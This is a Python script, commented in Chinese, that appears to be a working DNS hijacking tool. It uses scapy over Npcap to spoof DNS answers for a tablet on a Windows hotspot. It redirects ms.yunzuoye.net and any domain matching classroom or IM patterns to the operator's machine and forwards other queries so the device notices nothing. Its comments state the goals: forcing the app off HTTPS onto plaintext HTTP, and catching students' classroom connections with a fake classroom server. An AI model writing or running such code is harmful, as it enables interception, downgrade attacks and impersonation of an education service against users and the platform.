# -*- coding: utf-8 -*-
"""dns_hijack.py -- 链路层 DNS 劫持(仅定向): 把 ms.yunzuoye.net 解析到我们, 其余域名正常转发。

原理(与 npcap_http80.py 同一套 Npcap L2 冒充):
  * 平面板对【任意目标】的 53 端口 UDP 查询, 我们抢先应答
  * 只劫持 HIJACK 列表里的域名 -> 192.168.137.1
  * 其余查询: 转发到上游(默认 223.5.5.5)并把原始应答回填给平板 -> 应用完全无感
  * 目的: 让设备对 ms.yunzuoye.net 的 HTTPS 连接先落到我们(配合 relay 断流),
          迫使 getRequestUrlWithRESTFul 轮询回落到明文 URL(http://ms.yunzuoye.net/...)

用法: python dns_hijack.py [watch_seconds]
环境: DNS_HIJACK_HOSTS="ms.yunzuoye.net,ztp.yunzuoye.net"(逗号分隔, 默认只 ms)
      DNS_UPSTREAM="223.5.5.5"
      DNS_OUR_IP="192.168.137.1"
"""
import os
import socket
import sys
import time
import datetime
import threading

import warnings
warnings.filterwarnings("ignore")
from scapy.all import Ether, IP, UDP, DNS, DNSQR, DNSRR, Raw, conf, AsyncSniffer
from scapy.arch.windows import get_windows_if_list

BASE = os.path.dirname(os.path.abspath(__file__))
LOG = os.path.join(BASE, "dns_hijack.log")

PAD_MAC = "80:20:fd:8b:4b:fa"
# IFINDEX 会随热点重建而变(曾 12/13, 2026-10-16 为 11) => 用环境变量覆盖
IFINDEX = int(os.environ.get("DNS_IFINDEX") or 11)
WATCH = int(sys.argv[1]) if len(sys.argv) > 1 else 86400

OUR_IP = os.environ.get("DNS_OUR_IP", "192.168.137.1")
UPSTREAM = os.environ.get("DNS_UPSTREAM", "223.5.5.5")
HOSTS = tuple(x.strip().lower() for x in
              (os.environ.get("DNS_HIJACK_HOSTS") or "ms.yunzuoye.net").split(",") if x.strip())

# DNS-PATTERN-HIJACK: 按模式劫持"像 IM/盒子/教室服务"的域名。
#   依据: 学生端教室地址 = XHMicroServer.getActualIp("BSB301002"/"BSB301006"), 来自微服务表;
#   若该地址是域名, 只要解析到我们, 学生就会连到本机监听的 17 个 WS 端口 -> 伪教室接住。
#   4 个反编译应用里都没有 MultiCastClient 实例化 -> 学生端不用组播发现, 只能靠这条。
PATTERNS = tuple(x.strip().lower() for x in
                 (os.environ.get("DNS_HIJACK_PATTERNS")
                  or "bsb,box,im.,basket,socket,smartclass,classroom,lan-").split(",") if x.strip())


def _match_pattern(host):
    """按模式判定是否劫持该域名（命中会记日志, 便于事后核对）。"""
    try:
        h = (host or "").lower()
        for p in PATTERNS:
            if p and p in h:
                wlog("[DNS-PATTERN-HIT] %s (\u5339\u914d '%s')" % (host, p))
                return True
    except Exception:
        pass
    return False

_lock = threading.Lock()
_stats = {"q": 0, "hijack": 0, "fwd": 0, "fwdfail": 0, "seen53": 0}
_last_stat = [0.0]


def wlog(msg):
    line = "%s %s" % (datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3], msg)
    with _lock:
        try:
            with open(LOG, "a", encoding="utf-8", errors="replace") as f:
                f.write(line + "\n")
        except Exception:
            pass
    try:
        print(line, flush=True)
    except Exception:
        pass


def iface_name():
    # PATCH-IFACE: 优先按热点网卡 GUID 解析(热点重建时 ifIndex 会变, GUID 不变)
    _want = "{6E5C648D-1355-4F48-B5BA-047951DDDFA3}".lower()
    try:
        _lst = get_windows_if_list()
    except Exception:
        _lst = []
    for d in _lst:
        if str(d.get("guid", "")).lower() == _want:
            return r"\Device\NPF_" + d["guid"]
    for d in _lst:
        nm = (str(d.get("name", "")) + " " + str(d.get("description", ""))).lower()
        if "本地连接" in nm or "wi-fi direct" in nm or "local area connection*" in nm:
            return r"\Device\NPF_" + d["guid"]
    for d in _lst:
        if d.get("index") == IFINDEX:
            return r"\Device\NPF_" + d["guid"]


IFACE = iface_name()

# FIX-SOCK (2026-10-10 23:0x): 原来 send() 用了 _sock[0] 却从未定义 =>
# 每次发送都抛 "name '_sock' is not defined", DNS 劫持实际从未生效。补上全局。
_sock = [None]


def send(frame):
    try:
        if _sock[0] is None:
            _sock[0] = conf.L2socket(iface=IFACE)
        _sock[0].send(frame)
    except Exception as e:
        wlog("[SEND-ERR] %s" % e)


def pad_ip_of(pkt):
    return pkt[IP].src if IP in pkt else None


def upstream_query(raw_dns, timeout=3.0):
    """把原始 DNS 报文转发到上游, 返回原始应答字节"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(raw_dns, (UPSTREAM, 53))
        data, _ = s.recvfrom(4096)
        s.close()
        return data
    except Exception:
        return None


def on_pkt(pkt):
    try:
        if UDP not in pkt or IP not in pkt:
            return
        # DNS-ANY: 记录所有 53 端口流量(用于确认设备查询是否可见)
        if pkt[UDP].sport == 53 or pkt[UDP].dport == 53:
            _stats["seen53"] = _stats.get("seen53", 0) + 1
            if _stats["seen53"] <= 40 or _stats["seen53"] % 50 == 0:
                wlog("[DNS-SEEN #%d] %s:%d -> %s:%d len=%d" % (
                    _stats["seen53"], pkt[IP].src, pkt[UDP].sport, pkt[IP].dst, pkt[UDP].dport,
                    len(bytes(pkt[UDP].payload))))
        if DNS not in pkt:
            return
        if pkt[UDP].dport != 53:
            return
        d = pkt[DNS]
        if d.qr != 0 or d.qd is None:
            return
        qname = (d.qd.qname or b"").decode("utf-8", "replace").rstrip(".").lower()
        qtype = d.qd.qtype
        if not qname:
            return
        _stats["q"] += 1
        _stats["names"] = (_stats.get("names", "") + "," + qname)[-400:]
        wlog("[DNS-Q] %s (type=%s) from %s" % (qname, qtype, pkt[IP].src))

        # 只处理 A 查询(1); 其它类型也转发
        # DNS-PATTERN-HIJACK: 除固定名单外, 还按模式劫持"像 IM/盒子/教室"的域名
        if qtype == 1 and (any(qname == h or qname.endswith("." + h) for h in HOSTS)
                           or _match_pattern(qname)):
            _stats["hijack"] += 1
            wlog("!!!!!! [DNS-HIJACK] %s -> %s (平板 %s)" % (qname, OUR_IP, pkt[IP].src))
            resp = (Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) /
                    IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                    UDP(sport=53, dport=pkt[UDP].sport) /
                    DNS(id=d.id, qr=1, aa=1, rd=d.rd, ra=1,
                        qd=DNSQR(qname=pkt[DNS].qd.qname, qtype=1, qclass=1),
                        an=DNSRR(rrname=pkt[DNS].qd.qname, type="A", ttl=30, rdata=OUR_IP)))
            send(resp)
            return

        # 其余: 转发上游
        raw = bytes(pkt[UDP].payload)
        ans = upstream_query(raw)
        if ans is None:
            _stats["fwdfail"] += 1
            return
        _stats["fwd"] += 1
        resp = (Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) /
                IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                UDP(sport=53, dport=pkt[UDP].sport) /
                Raw(ans))
        send(resp)
    except Exception as e:
        wlog("[PKT-ERR] %s" % e)


def main():
    wlog("===== dns_hijack start %s watch=%ds iface=%s hijack=%s our=%s upstream=%s =====" % (
        datetime.datetime.now(), WATCH, IFACE, ",".join(HOSTS), OUR_IP, UPSTREAM))
    if not IFACE:
        wlog("[FATAL] 找不到接口 (IFINDEX=%d)" % IFINDEX)
        return
    sn = AsyncSniffer(iface=IFACE, store=False, prn=on_pkt, filter="udp and port 53")
    sn.start()
    t0 = time.time()
    while time.time() - t0 < WATCH:
        time.sleep(10)
        now = time.time()
        if now - _last_stat[0] >= 60:
            _last_stat[0] = now
            wlog("[stat] %s" % _stats)
    try:
        sn.stop()
    except Exception:
        pass
    wlog("[EXIT] %s" % _stats)


if __name__ == "__main__":
    main()
